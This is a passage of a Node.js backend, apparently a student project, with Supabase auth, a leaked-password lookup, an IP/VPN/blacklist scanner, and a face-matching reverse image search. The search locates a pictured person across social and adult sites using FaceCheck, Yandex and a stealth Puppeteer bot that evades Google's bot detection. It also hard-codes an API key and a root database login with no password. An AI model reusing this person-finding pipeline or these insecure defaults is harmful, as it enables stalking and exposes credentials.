require("dotenv").config();
const express = require("express");
const mysql = require("mysql2");
const cors = require("cors");
const crypto = require("crypto");
const { error } = require("console");
const { createClient } = require("@supabase/supabase-js");

const SUPABASE_URL        = process.env.SUPABASE_URL;
const SUPABASE_SECRET_KEY = process.env.SUPABASE_SECRET_KEY;
const SUPABASE_ANON_KEY   = process.env.SUPABASE_ANON_KEY || SUPABASE_SECRET_KEY;

// Admin client - uses secret key for privileged operations (createUser, getUser, etc.)
const supabaseAdmin = createClient(SUPABASE_URL, SUPABASE_SECRET_KEY, {
  auth: { autoRefreshToken: false, persistSession: false },
});
// User client - uses anon/publishable key for user-facing auth REST calls
const supabaseUser = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
  auth: { autoRefreshToken: false, persistSession: false },
});
const dns = require("dns").promises;
const net = require("net");
const axios = require("axios");
const FormData = require("form-data");
const fs = require("fs");
const https = require("https");
const puppeteer = require("puppeteer");
const WHATISMYIP_KEY = "5afcc7cf5b59fc3a842827e9a4ab454a";
const IMGBB_KEY        = process.env.IMGBB_KEY        || "";
const SERPAPI_KEY      = process.env.SERPAPI_KEY      || "";
const FACECHECK_TOKEN  = process.env.FACECHECK_TOKEN  || "";
const FACE_SERVICE_URL = process.env.FACE_SERVICE_URL || "http://localhost:5001";

// ── Domain categorisation ─────────────────────────────────────────────────────
const SOCIAL_DOMAINS = new Set([
  "facebook.com","instagram.com","twitter.com","x.com","linkedin.com",
  "pinterest.com","tiktok.com","snapchat.com","vk.com","youtube.com",
  "reddit.com","tumblr.com","flickr.com","deviantart.com","behance.net",
  "dribbble.com","500px.com","myspace.com","weibo.com","ok.ru",
]);
const NEWS_DOMAINS = new Set([
  "bbc.com","cnn.com","reuters.com","theguardian.com","nytimes.com",
  "washingtonpost.com","forbes.com","businessinsider.com","techcrunch.com",
  "theverge.com","wired.com","huffpost.com","dailymail.co.uk","bloomberg.com",
  "apnews.com","nbcnews.com","foxnews.com","independent.co.uk","telegraph.co.uk",
]);
const ADULT_DOMAINS = new Set([
  "pornhub.com","xvideos.com","xnxx.com","xhamster.com","redtube.com",
  "youporn.com","tube8.com","spankbang.com","beeg.com","porntrex.com",
  "onlyfans.com","fansly.com","manyvids.com","clips4sale.com",
  "fapello.com","erome.com","bunkr.si","bunkr.la","thothub.to",
  "nudostar.com","simpcity.su","coomer.su","kemono.su","scrolller.com",
  "adultfriendfinder.com","ashleymadison.com","seeking.com",
  "chaturbate.com","cam4.com","myfreecams.com","stripchat.com",
  "livejasmin.com","jerkmate.com","brazzers.com","bangbros.com",
  "naughtyamerica.com","reality-kings.com","mofos.com",
]);
const ADULT_KEYWORDS = [
  "porn","xxx","sex","nude","naked","nsfw","erotic","escort",
  "onlyfan","fap","lewd","hentai","milf","camgirl","fetish","bdsm",
];

function categorizeDomain(url) {
  try {
    const host = new URL(url).hostname.replace(/^www\./, "").toLowerCase();
    if ([...SOCIAL_DOMAINS].some(d => host === d || host.endsWith("." + d))) return "social";
    if ([...NEWS_DOMAINS].some(d =>  host === d || host.endsWith("." + d))) return "news";
    if ([...ADULT_DOMAINS].some(d =>  host === d || host.endsWith("." + d))) return "adult";
    if (ADULT_KEYWORDS.some(k => host.includes(k))) return "adult";
    return "unknown";
  } catch { return "unknown"; }
}

// ── Confidence scoring ────────────────────────────────────────────────────────
// Yandex > Google for faces; position 1 = highest confidence
function scoreByPosition(position, total, engine) {
  const top  = engine === "yandex" ? 93 : 88;
  const floor = engine === "yandex" ? 63 : 58;
  if (total <= 1) return top;
  const t = (position - 1) / Math.max(total - 1, 1);
  return Math.round(top - t * (top - floor));
}

// ── Relevance scoring: face similarity + name match + engine quality ──────────
// Returns a composite 0-200 score used to rank results with the same person first
function computeRelevanceScore(match, personName) {
  let score = 0;

  // Face similarity is the strongest signal (0-100 from cosine similarity)
  if (match.faceVerified) {
    score += match.faceConfidence != null ? match.faceConfidence : 70;
    score += 60; // bonus for being face-confirmed
  } else if (match.engine === "facecheck") {
    // FaceCheck is always face-specific even if local re-verify didn't run
    score += match.confidence + 40;
  }

  // Name match in title/source (up to +30)
  if (personName) {
    const parts = personName.toLowerCase().split(/\s+/).filter(p => p.length > 1);
    const text  = `${match.title} ${match.source}`.toLowerCase();
    const hits  = parts.filter(p => text.includes(p)).length;
    if (hits > 0) score += Math.round((hits / parts.length) * 30);
  }

  // Base position confidence when face not verified
  if (!match.faceVerified && match.engine !== "facecheck") {
    score += match.confidence * 0.4;
  }

  // Exact Vision match bonus (same pixels)
  if (match.engine === "vision" && match.confidence >= 95) score += 10;

  return score;
}

// ── FaceCheck.id helper (production mode) ────────────────────────────────────
async function runFaceCheck(imagePath) {
  if (!FACECHECK_TOKEN) return [];
  const API = "https://facecheck.id";
  try {
    const form = new FormData();
    form.append("images", fs.createReadStream(imagePath));
    form.append("id_search", "");
    const up = await axios.post(API + "/api/upload_pic", form, {
      headers: { ...form.getHeaders(), Authorization: FACECHECK_TOKEN },
      timeout: 20000,
    });
    if (up.data.error) throw new Error(up.data.error);
    const id_search = up.data.id_search;
    console.log("FaceCheck id_search:", id_search);

    // Poll - production mode (demo:false) is much faster than testing mode
    const deadline = Date.now() + 90000;
    while (Date.now() < deadline) {
      await new Promise(r => setTimeout(r, 2500));
      const sr = await axios.post(
        API + "/api/search",
        { id_search, with_progress: true, status_only: false, demo: false },
        { headers: { accept: "application/json", Authorization: FACECHECK_TOKEN }, timeout: 12000 }
      );
      if (sr.data.error) throw new Error(sr.data.error);
      if (sr.data.output) {
        const items = sr.data.output.items || [];
        console.log(`✅ FaceCheck: ${items.length} face matches`);
        return items;
      }
      console.log(`FaceCheck progress: ${sr.data.progress ?? "?"}%`);
    }
    console.log("FaceCheck timed out");
    return [];
  } catch (err) {
    console.log("FaceCheck skipped:", err.message);
    return [];
  }
}

// ── Google Cloud Vision - Web Detection ──────────────────────────────────────
// Official Google API: same engine as Google Lens, returns exact matches,
// partial matches, and every page where the image appears. No bot detection.
async function runGoogleVision(imagePath) {
  const keyFile     = process.env.GOOGLE_VISION_KEY_FILE;
  const clientEmail = process.env.GOOGLE_VISION_CLIENT_EMAIL;
  const privateKey  = process.env.GOOGLE_VISION_PRIVATE_KEY;

  if (!clientEmail && !keyFile) {
    console.log("Google Vision skipped: no credentials set");
    return { exact: [], partial: [], pages: [], similar: [], bestLabel: null };
  }

  // Prefer env-var credentials (production) over key file (local dev)
  const useEnvCreds = !!clientEmail;

  if (!useEnvCreds && keyFile && !require("fs").existsSync(keyFile)) {
    console.log("Google Vision skipped: key file not found:", keyFile);
    return { exact: [], partial: [], pages: [], similar: [], bestLabel: null };
  }

  try {
    const vision = require("@google-cloud/vision");
    const client = useEnvCreds
      ? new vision.ImageAnnotatorClient({
          credentials: {
            client_email: clientEmail,
            private_key: privateKey.replace(/\\n/g, "\n"),
          },
        })
      : new vision.ImageAnnotatorClient({ keyFilename: keyFile });
    const [result] = await client.webDetection(imagePath);
    const wd = result.webDetection || {};

    const exact   = (wd.fullMatchingImages    || []).map(i => ({ url: i.url, score: i.score || 1 }));
    const partial = (wd.partialMatchingImages || []).map(i => ({ url: i.url, score: i.score || 0.7 }));
    const similar = (wd.visuallySimilarImages || []).map(i => ({ url: i.url, score: i.score || 0.5 }));
    const pages   = (wd.pagesWithMatchingImages || []).map(p => ({
      url:   p.url,
      title: p.pageTitle || "",
      fullImages:    (p.fullMatchingImages    || []).map(i => i.url),
      partialImages: (p.partialMatchingImages || []).map(i => i.url),
    }));
    const bestLabel = wd.bestGuessLabels?.[0]?.label || null;

    console.log(
      `✅ Google Vision: ${exact.length} exact + ${partial.length} partial + ${pages.length} pages + ${similar.length} similar`
    );
    return { exact, partial, similar, pages, bestLabel };
  } catch (err) {
    console.log("Google Vision skipped:", err.message);
    return { exact: [], partial: [], pages: [], similar: [], bestLabel: null };
  }
}

// ── Scrape external result links from whatever page the bot landed on ─────────
async function scrapeBotPage(page) {
  const finalUrl  = page.url();
  const pageTitle = await page.title().catch(() => "");
  console.log(`Lens Bot: URL=${finalUrl.slice(0, 80)} | title="${pageTitle.slice(0, 60)}"`);

  if (finalUrl.includes("sorry/index") || finalUrl.includes("consent.google")) {
    console.log("Lens Bot: blocked by Google (consent/captcha) - 0 results");
    return [];
  }

  const GOOGLE_HOSTS = [
    "google.com", "google.co.", "gstatic.com", "googleapis.com",
    "googleadservices.com", "youtube.com", "accounts.google", "ggpht.com",
  ];

  const results = await page.evaluate((GH) => {
    const out  = [];
    const seen = new Set();

    document.querySelectorAll("a[href]").forEach((anchor) => {
      const href = anchor.href || "";
      if (!href || href.startsWith("javascript") || href.startsWith("#")) return;
      try {
        const host = new URL(href).hostname.toLowerCase();
        if (GH.some(gh => host === gh || host.endsWith("." + gh) || host.includes(gh))) return;
      } catch { return; }

      if (seen.has(href)) return;
      seen.add(href);

      const img =
        anchor.querySelector("img") ||
        anchor.closest("[data-ved]")?.querySelector("img") ||
        anchor.parentElement?.querySelector("img");

      let src = img?.src || img?.getAttribute("data-src") || "";
      if (src.startsWith("data:") && src.length < 800) src = "";

      let source = "";
      try { source = new URL(href).hostname.replace(/^www\./, ""); } catch {}

      const title =
        anchor.querySelector("h3, h4, [role='heading'], .LC20lb")?.textContent?.trim() ||
        anchor.getAttribute("aria-label")?.trim() ||
        img?.alt?.trim() ||
        source;

      out.push({ title: title || source, link: href, source, thumbnail: src });
    });

    out.sort((a, b) => (b.thumbnail ? 1 : 0) - (a.thumbnail ? 1 : 0));
    return out.slice(0, 20);
  }, GOOGLE_HOSTS);

  console.log(`✅ Lens Bot scraped: ${results.length} results`);
  return results;
}

// ── Google Lens Puppeteer bot (stealth mode) ─────────────────────────────────
// Uses puppeteer-extra + stealth plugin to evade bot detection, then navigates
// Google Images organically: homepage → camera icon → paste URL → results.
async function runGoogleLensBot(imagePath, publicUrl) {
  if (!publicUrl) return [];
  let browser = null;

  try {
    console.log("🤖 Google Lens Bot starting (stealth mode)...");

    const puppeteerExtra = require("puppeteer-extra");
    const StealthPlugin  = require("puppeteer-extra-plugin-stealth");
    puppeteerExtra.use(StealthPlugin());

    browser = await puppeteerExtra.launch({
      headless: true,
      executablePath: require("puppeteer").executablePath(),
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--disable-gpu",
        "--window-size=1280,900",
        "--lang=en-US,en",
      ],
      defaultViewport: { width: 1280, height: 900 },
    });

    const page = await browser.newPage();
    await page.setExtraHTTPHeaders({ "Accept-Language": "en-US,en;q=0.9" });

    // Stealth handles bot-signal masking - navigate directly to the reverse
    // image search endpoint (no camera-click flow needed).
    const searchUrl = `https://www.google.com/searchbyimage?sbisrc=1&image_url=${encodeURIComponent(publicUrl)}`;
    console.log("Lens Bot: navigating to reverse image search...");
    await page.goto(searchUrl, { waitUntil: "domcontentloaded", timeout: 25000 });

    // Dismiss consent banner if redirected (EU/regional)
    try {
      const cur = page.url();
      if (cur.includes("consent.google") || cur.includes("accounts.google")) {
        console.log("Lens Bot: consent redirect - accepting...");
        const btn = await page.waitForSelector(
          'button[id="L2AGLb"], [aria-label*="Accept all"], [jsname="higCR"]',
          { timeout: 4000 }
        );
        await btn.click();
        await page.waitForNavigation({ waitUntil: "domcontentloaded", timeout: 12000 }).catch(() => {});
      }
    } catch (_) {}

    // Wait for search results to render
    await Promise.race([
      page.waitForNavigation({ waitUntil: "domcontentloaded", timeout: 15000 }),
      new Promise(r => setTimeout(r, 5000)),
    ]).catch(() => {});
    await new Promise(r => setTimeout(r, 2500));

    const results = await scrapeBotPage(page);
    await browser.close();
    return results;

  } catch (err) {
    console.log("Google Lens Bot skipped:", err.message);
    if (browser) await browser.close().catch(() => {});
    return [];
  }
}

// ── Yandex Images helper ──────────────────────────────────────────────────────
// Yandex is the industry-best engine for facial recognition in reverse image search
async function runYandex(imageUrl, name = "") {
  try {
    const params = { engine: "yandex_images", url: imageUrl, api_key: SERPAPI_KEY };
    if (name) params.text = name; // combine image + name for better person-specific results
    const res = await axios.get("https://serpapi.com/search.json", { params, timeout: 60000 });
    const raw = res.data.image_results || res.data.organic_results || [];
    console.log(`✅ Yandex: ${raw.length} matches`);
    return raw;
  } catch (err) {
    console.log("Yandex skipped:", err.message);
    return [];
  }
}

// ── Google Images text search by person name ──────────────────────────────────
async function runGoogleImagesByName(name) {
  if (!name || !SERPAPI_KEY) return [];
  try {
    const res = await axios.get("https://serpapi.com/search.json", {
      params: { engine: "google_images", q: name, api_key: SERPAPI_KEY, safe: "off", hl: "en", num: 20 },
      timeout: 30000,
    });
    const raw = res.data.images_results || [];
    console.log(`✅ Google Images by name "${name}": ${raw.length} results`);
    return raw;
  } catch (err) {
    console.log("Google Images by name skipped:", err.message);
    return [];
  }
}


// ── Face Service helpers ──────────────────────────────────────────────────────
async function getFaceEmbedding(imagePath) {
  try {
    const imgBuffer = fs.readFileSync(imagePath);
    const res = await axios.post(`${FACE_SERVICE_URL}/embed`, imgBuffer, {
      headers: { "Content-Type": "application/octet-stream" },
      timeout: 20000,
    });
    return res.data.embedding || null;
  } catch (err) {
    console.log("Face embedding skipped:", err.message);
    return null;
  }
}

async function verifyFacesBatch(embedding, urls) {
  if (!embedding || !urls.length) return [];
  try {
    const res = await axios.post(`${FACE_SERVICE_URL}/verify-batch`, {
      embedding,
      urls: urls.slice(0, 60),
    }, { timeout: 120000 });
    return res.data || [];
  } catch (err) {
    console.log("Face batch verify skipped:", err.message);
    return [];
  }
}

const app = express();
app.use(cors({
  origin: (origin, cb) => {
    if (!origin || /^http:\/\/localhost(:\d+)?$/.test(origin) || origin === process.env.FRONTEND_URL) {
      cb(null, true);
    } else {
      cb(new Error("Not allowed by CORS"));
    }
  },
  allowedHeaders: ["Content-Type", "Authorization", "x-admin-secret"],
  credentials: true,
}));
app.use(express.json());

// ── Auth Middleware ───────────────────────────────────────────────────────────
async function verifyAuth(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.status(401).json({ error: "No token provided" });
  const { data: { user }, error } = await supabaseAdmin.auth.getUser(token);
  if (error || !user) return res.status(401).json({ error: "Invalid or expired token" });
  req.user = user;
  next();
}

// ── Auth Routes ───────────────────────────────────────────────────────────────
app.post("/auth/signup", async (req, res) => {
  const { name, email, password } = req.body;
  if (!name || !email || !password)
    return res.status(400).json({ error: "Name, email, and password are required" });
  if (password.length < 8)
    return res.status(400).json({ error: "Password must be at least 8 characters" });

  const { data, error } = await supabaseAdmin.auth.admin.createUser({
    email,
    password,
    user_metadata: { name },
    email_confirm: false,
  });

  if (error) {
    if (error.message.toLowerCase().includes("already")) {
      return res.status(409).json({ error: "An account with this email already exists" });
    }
    return res.status(400).json({ error: error.message });
  }

  return res.json({ success: true, needsVerification: true, userId: data.user.id });
});

app.post("/auth/login", async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password)
    return res.status(400).json({ error: "Email and password are required" });

  const { data, error } = await supabaseUser.auth.signInWithPassword({ email, password });
  if (error) {
    const msg = error.message.toLowerCase();
    if (msg.includes("email not confirmed") || msg.includes("not confirmed")) {
      return res.status(403).json({ code: "EMAIL_NOT_VERIFIED", error: "Please verify your email before signing in" });
    }
    return res.status(401).json({ error: "Invalid email or password" });
  }
  const { session, user } = data;
  return res.json({
    success: true,
    accessToken:  session.access_token,
    refreshToken: session.refresh_token,
    expiresIn:    session.expires_in,
    user: {
      id:            user.id,
      email:         user.email,
      name:          user.user_metadata?.name || user.email.split("@")[0],
      avatar:        `https://api.dicebear.com/7.x/avataaars/svg?seed=${encodeURIComponent(user.email)}`,
      emailVerified: !!user.email_confirmed_at,
    },
  });
});

app.post("/auth/refresh", async (req, res) => {
  const { refreshToken } = req.body;
  if (!refreshToken) return res.status(400).json({ error: "Refresh token required" });

  const { data, error } = await supabaseUser.auth.refreshSession({ refresh_token: refreshToken });
  if (error || !data.session) {
    return res.status(401).json({ error: "Session expired. Please log in again." });
  }
  const { session, user } = data;
  return res.json({
    accessToken:  session.access_token,
    refreshToken: session.refresh_token,
    expiresIn:    session.expires_in,
    user: {
      id:            user.id,
      email:         user.email,
      name:          user.user_metadata?.name || user.email.split("@")[0],
      avatar:        `https://api.dicebear.com/7.x/avataaars/svg?seed=${encodeURIComponent(user.email)}`,
      emailVerified: !!user.email_confirmed_at,
    },
  });
});

app.post("/auth/logout", async (req, res) => {
  const token = req.headers.authorization?.split(" ")[1];
  if (token) {
    try {
      await axios.post(
        `${SUPABASE_URL}/auth/v1/logout`,
        {},
        { headers: { apikey: SUPABASE_ANON_KEY, Authorization: `Bearer ${token}`, "Content-Type": "application/json" } }
      );
    } catch { /* best-effort */ }
  }
  return res.json({ success: true });
});

app.get("/auth/me", verifyAuth, (req, res) => {
  const user = req.user;
  return res.json({
    id: user.id,
    email: user.email,
    name: user.user_metadata?.name || user.email.split("@")[0],
    avatar: `https://api.dicebear.com/7.x/avataaars/svg?seed=${encodeURIComponent(user.email)}`,
    emailVerified: !!user.email_confirmed_at,
  });
});

app.post("/auth/resend-verification", async (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ error: "Email required" });
  const { error } = await supabaseUser.auth.resend({
    type: "signup",
    email,
    options: { emailRedirectTo: `${process.env.FRONTEND_URL}/auth/callback` },
  });
  if (error) {
    const msg = error.message.toLowerCase();
    if (msg.includes("already confirmed") || msg.includes("already registered")) {
      return res.status(400).json({ error: "This email is already verified. Please sign in." });
    }
    if (msg.includes("security") || msg.includes("after") || msg.includes("wait") || msg.includes("rate")) {
      return res.status(429).json({ error: "Please wait a minute before requesting another verification email." });
    }
    console.log("Resend error:", error.message);
    return res.status(400).json({ error: error.message || "Could not resend verification email." });
  }
  return res.json({ success: true });
});

const db = mysql.createConnection({
  host: "localhost",
  user: "root",
  password: "",
  database: "fyp_db",
});

// Connect
db.connect((err) => {
  if (err) {
    console.error("DB connection failed:", err);
    return;
  }
  console.log("MySQL connected");
});

// Endpoint to check password
app.post("/check-password", (req, res) => {
  const { password } = req.body;

  if (!password) return res.status(400).json({ error: "Password required" });

  const hash = crypto.createHash("sha1").update(password).digest("hex");

  const query = "SELECT * FROM leaked_passwords WHERE hash = ?";
  db.query(query, [hash], (err, results) => {
    if (results.length > 0) {
      return res.json({ leaked: true });
    } else {
      return res.json({ leaked: false });
    }
  });
});

const RBL_SERVERS = [
  "all.s5h.net",
  "xbl.spamhaus.org",
  "sbl.spamhaus.org",
  "b.barracudacentral.org",
  "bl.0spam.org",
  "bl.spamcop.net",
  "blacklist.woody.ch",
  "bogons.cymru.com",
  "combined.abuse.ch",
  "db.wpbl.info",
  "dnsbl-1.uceprotect.net",
  "dnsbl-2.uceprotect.net",
  "dnsbl-3.uceprotect.net",
  "dnsbl.dronebl.org",
  "drone.abuse.ch",
  "duinv.aupads.org",
  "dyna.spamrats.com",
  "ips.backscatterer.org",
  "korea.services.net",
  "noptr.spamrats.com",
  "orvedb.aupads.org",
  "proxy.bl.gweep.ca",
  "psbl.surriel.com",
  "rbl.0spam.org",
  "relays.bl.gweep.ca",
  "relays.nether.net",
  "singular.ttk.pte.hu",
  "spam.abuse.ch",
  "spam.dnsbl.anonmails.de",
  "spam.spamrats.com",
  "spambot.bls.digibase.ca",
  "spamrbl.imp.ch",
  "spamsources.fabel.dk",
  "ubl.lashback.com",
  "ubl.unsubscore.com",
  "virus.rbl.jp",
  "wormrbl.imp.ch",
  "z.mailspike.net",
];

function reverseIPv4(ip) {
  return ip.split(".").reverse().join(".");
}

// backend helper code for dnsbl scanner
async function checkRBL(ip) {
  const reversedIP = reverseIPv4(ip);

  let listed = [];
  let checked = 0;

  for (const rbl of RBL_SERVERS) {
    checked++;
    const lookup = `${reversedIP}.${rbl}`;

    try {
      await dns.resolve4(lookup);
      listed.push(rbl);
    } catch (err) {}
  }

  return {
    totalChecks: checked,
    listedCount: listed.length,
    listedOn: listed,
  };
}

// Known VPN/proxy ISP name fragments for fallback detection
const VPN_ISP_KEYWORDS = [
  "nordvpn","expressvpn","surfshark","mullvad","protonvpn","cyberghost",
  "ipvanish","private internet access","windscribe","hidemyass","tunnelbear",
  "hotspot shield","purevpn","hide.me","ivpn","azirevpn","airvpn",
  "vpnunlimited","strongvpn","vyprvpn","torguard","astrill","perfect privacy",
  "ovpn","cryptostorm","trust.zone","pia vpn","zenmate","avira vpn",
  "norton vpn","mcafee vpn","bitdefender vpn","avast vpn","avg vpn",
  "opera vpn","turbo vpn","urban vpn","speedify","hola vpn",
];

app.post("/scan-ip", async (req, res) => {
  try {
    const { ip } = req.body;
    if (!ip || !net.isIP(ip)) return res.status(400).json({ error: "Invalid IP address" });

    // Run all three checks in parallel
    const [geoResult, pcResult, rblResult] = await Promise.allSettled([
      // ip-api.com - geo + broad proxy/hosting flags (free, no key)
      axios.get(
        `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,org,as,proxy,hosting,mobile,query`,
        { timeout: 7000 }
      ).then(r => r.data),

      // proxycheck.io - VPN type classification (free, no key, 100/day; 1000/day with free key)
      axios.get(
        `https://proxycheck.io/v2/${ip}?vpn=1&asn=1`,
        { timeout: 9000 }
      ).then(r => r.data),

      // DNSBL blacklist checks
      net.isIP(ip) === 4
        ? checkRBL(ip)
        : Promise.resolve({ totalChecks: 0, listedCount: 0, listedOn: [] }),
    ]);

    const geo = geoResult.status === "fulfilled" && geoResult.value?.status === "success"
      ? geoResult.value : {};
    const pc  = pcResult.status  === "fulfilled" ? pcResult.value?.[ip]  : null;
    const rbl = rblResult.status === "fulfilled" ? rblResult.value
      : { totalChecks: 0, listedCount: 0, listedOn: [] };

    // ── VPN / proxy / Tor classification ──────────────────────────────────────
    const pcType = (pc?.type || "").toLowerCase();   // "vpn", "tor", "socks5", etc.
    const pcProxy = pc?.proxy === "yes";

    const isVPN_pc   = pcProxy && pcType === "vpn";
    const isTor_pc   = pcProxy && pcType === "tor";
    const isProxy_pc = pcProxy && !isVPN_pc && !isTor_pc;

    // ip-api.com broad proxy flag (catches VPNs too)
    const isProxy_geo = geo.proxy === true;
    const isHosting   = geo.hosting === true || ["hosting","datacenter","cdn","businesshostingdns"].includes(pcType);

    // ISP name matching as last-resort VPN detection
    const ispLower  = ((geo.isp || "") + " " + (geo.org || "")).toLowerCase();
    const isVPN_isp = VPN_ISP_KEYWORDS.some(k => ispLower.includes(k));

    const isVPN   = isVPN_pc   || isVPN_isp;
    const isTor   = isTor_pc;
    const isProxy = (isProxy_pc || isProxy_geo) && !isVPN && !isTor;

    const vpnProvider = isVPN
      ? (pc?.provider || (isVPN_isp ? (geo.isp || null) : null))
      : null;

    console.log(`IP scan ${ip}: VPN=${isVPN}(pc:${isVPN_pc},isp:${isVPN_isp}) Proxy=${isProxy} Tor=${isTor} Hosting=${isHosting} pcType=${pcType || "n/a"}`);

    res.json({
      ip,
      version: net.isIP(ip) === 6 ? "IPv6" : "IPv4",
      location: {
        city:        geo.city        || "Unknown",
        region:      geo.regionName  || "Unknown",
        country:     geo.country     || "Unknown",
        countryCode: geo.countryCode || "",
      },
      network: {
        isp:    geo.isp  || "Unknown ISP",
        org:    geo.org  || null,
        as:     geo.as   || null,
        mobile: geo.mobile || false,
      },
      privacy: {
        isVPN,
        isProxy,
        isTor,
        isHosting,
        vpnProvider,
        proxyType:       pc?.type  || null,
        blacklistChecks: rbl.totalChecks,
        blacklistTrue:   rbl.listedCount,
        blacklistedOn:   rbl.listedOn,
      },
    });
  } catch (err) {
    console.error("IP scan failed:", err);
    res.status(500).json({ error: "IP scan failed" });
  }
});

// -------------------- Reverse Image Search: imgbb + SerpAPI Google Lens --------------------
const multer = require("multer");
const path = require("path");

const uploadDir = "./uploads";
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadDir),
  filename: (req, file, cb) =>
    cb(null, Date.now() + path.extname(file.originalname)),
});
const upload = multer({
  storage,
  limits: { fileSize: 10 * 1024 * 1024 }, // 10 MB
  fileFilter: (req, file, cb) => {
    const allowed = ["image/jpeg", "image/png", "image/webp", "image/gif"];
    if (allowed.includes(file.mimetype)) cb(null, true);
    else cb(new Error("Only JPEG, PNG, WEBP, and GIF images are allowed"));
  },
});

app.post("/scan-image", upload.single("image"), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No image uploaded" });

  const tmpFile = req.file.path;

  try {
    if (!IMGBB_KEY)   throw new Error("IMGBB_KEY not set in backend/.env");
    if (!SERPAPI_KEY) throw new Error("SERPAPI_KEY not set in backend/.env");

    // 1. EXIF metadata - local, fast
    let metadata = {
      camera: null, dateTaken: null, software: null,
      gps: null, dimensions: null, orientation: null,
    };
    try {
      const { default: exifr } = await import("exifr");
      const exif = await exifr.parse(tmpFile, {
        gps: true, tiff: true, exif: true, xmp: false, iptc: false,
      });
      if (exif) {
        metadata = {
          camera:     exif.Make ? `${exif.Make} ${exif.Model || ""}`.trim() : null,
          dateTaken:  exif.DateTimeOriginal || exif.CreateDate || null,
          software:   exif.Software || null,
          gps:        exif.latitude != null && exif.longitude != null
                        ? { latitude: +exif.latitude.toFixed(5), longitude: +exif.longitude.toFixed(5) }
                        : null,
          dimensions: exif.ExifImageWidth && exif.ExifImageHeight
                        ? `${exif.ExifImageWidth} × ${exif.ExifImageHeight}` : null,
          orientation: exif.Orientation || null,
        };
      }
    } catch (metaErr) {
      console.log("EXIF parse skipped:", metaErr.message);
    }

    // 2. Upload to imgbb (stream - no base64 bloat)
    const imgbbForm = new FormData();
    imgbbForm.append("image", fs.createReadStream(tmpFile), {
      filename: path.basename(tmpFile),
      contentType: req.file.mimetype,
    });
    console.log("Uploading to imgbb...");
    const imgbbRes = await axios.post(
      `https://api.imgbb.com/1/upload?key=${IMGBB_KEY}&expiration=300`,
      imgbbForm,
      { headers: imgbbForm.getHeaders(), timeout: 60000 }
    );
    if (!imgbbRes.data?.success)
      throw new Error("imgbb upload failed: " + JSON.stringify(imgbbRes.data));
    const publicUrl = imgbbRes.data.data.url;
    console.log("Image hosted:", publicUrl);

    // 3. Get face embedding BEFORE deleting tmpFile
    const faceEmbedding = await getFaceEmbedding(tmpFile);
    if (faceEmbedding) console.log("✅ Face embedding extracted (128-dim)");
    else                console.log("⚠️  No face detected in uploaded image - skipping face verification");

    // Optional person name for supplemental name-based image search
    const personName = (req.body?.name || "").trim();
    if (personName) console.log(`🔎 Person name provided: "${personName}" - running name-based image search`);

    // 4. Fire all engines in parallel
    console.log("Running Google Lens + Google Vision + Yandex + FaceCheck in parallel...");
    const [lensResult, visionData, yandexRaw, faceItems, nameImageRaw] = await Promise.all([
      axios.get("https://serpapi.com/search.json", {
        params: {
          engine: "google_lens", url: publicUrl, api_key: SERPAPI_KEY,
          no_cache: true, hl: "en",
          ...(personName ? { q: personName } : {}),  // combine image + name in Lens
        },
        timeout: 60000,
      }).catch(e => { console.log("Google Lens error:", e.message); return null; }),

      runGoogleVision(tmpFile),
      runYandex(publicUrl, personName),   // pass name for combined text+image Yandex search
      runFaceCheck(tmpFile),
      runGoogleImagesByName(personName),
    ]);

    if (fs.existsSync(tmpFile)) fs.unlinkSync(tmpFile);

    // 4. Google Lens matches (SerpAPI)
    const kg = lensResult?.data?.knowledge_graph || {};
    const googleRaw = lensResult?.data?.visual_matches || [];
    const googleMatches = googleRaw.map((m, i) => ({
      title:       m.title     || "",
      link:        m.link      || "",
      source:      m.source    || "",
      thumbnail:   m.thumbnail || "",
      _verifyUrl:  m.thumbnail || "",   // Lens only has thumbnails
      engine:      "google",
      confidence:  scoreByPosition(i + 1, googleRaw.length, "google"),
      category:    categorizeDomain(m.link || ""),
    }));

    // 5. Yandex matches - use full-size original image for face verification
    const yandexMatches = yandexRaw.map((m, i) => {
      const link     = m.link || "";
      const thumb    = m.thumbnail?.src || m.thumbnail || "";
      const original = m.original_image?.link || m.original || "";
      let source = "";
      try { source = new URL(link || original).hostname.replace(/^www\./, ""); } catch {}
      return {
        title:      m.title || "",
        link:       link || original,
        source:     m.source || source,
        thumbnail:  thumb,
        _verifyUrl: original || thumb,  // prefer full-size for accurate face detection
        engine:     "yandex",
        confidence: scoreByPosition(i + 1, yandexRaw.length, "yandex"),
        category:   categorizeDomain(link || original),
      };
    });

    // 6. FaceCheck matches - face-engine results, pre-verified by definition
    const faceMatches = faceItems.map((item) => {
      let domain = "";
      try { domain = new URL(item.url).hostname.replace(/^www\./, ""); } catch { domain = item.url; }
      return {
        title:      domain,
        link:       item.url   || "",
        source:     domain,
        thumbnail:  item.base64 || "",
        _verifyUrl: "",        // base64 thumbnail can't be re-fetched; skip re-verify
        engine:     "facecheck",
        confidence: item.score  || 80,
        category:   categorizeDomain(item.url || ""),
      };
    });

    // 7. Google Vision - link IS the image URL so use it for face verification
    const visionMatches = [
      ...visionData.exact.map((v, i) => ({
        title: "", link: v.url, source: "", thumbnail: v.url, _verifyUrl: v.url,
        engine: "vision", confidence: 95, category: categorizeDomain(v.url),
      })),
      ...visionData.partial.map((v, i) => ({
        title: "", link: v.url, source: "", thumbnail: v.url, _verifyUrl: v.url,
        engine: "vision", confidence: 75, category: categorizeDomain(v.url),
      })),
    ].map(m => {
      let source = "";
      try { source = new URL(m.link).hostname.replace(/^www\./, ""); } catch {}
      return { ...m, title: m.title || source, source };
    });

    // 8. Vision pages - every page where Google found this image (shown as "botMatches" section)
    const visionPages = visionData.pages.map((p, i) => {
      let source = "";
      try { source = new URL(p.url).hostname.replace(/^www\./, ""); } catch {}
      const thumb = p.fullImages?.[0] || p.partialImages?.[0] || "";
      return {
        title:      p.title   || source,
        link:       p.url,
        source,
        thumbnail:  thumb,
        engine:     "bot",     // reuse "bot" slot in frontend for Vision pages
        confidence: scoreByPosition(i + 1, visionData.pages.length, "google"),
        category:   categorizeDomain(p.url),
      };
    });
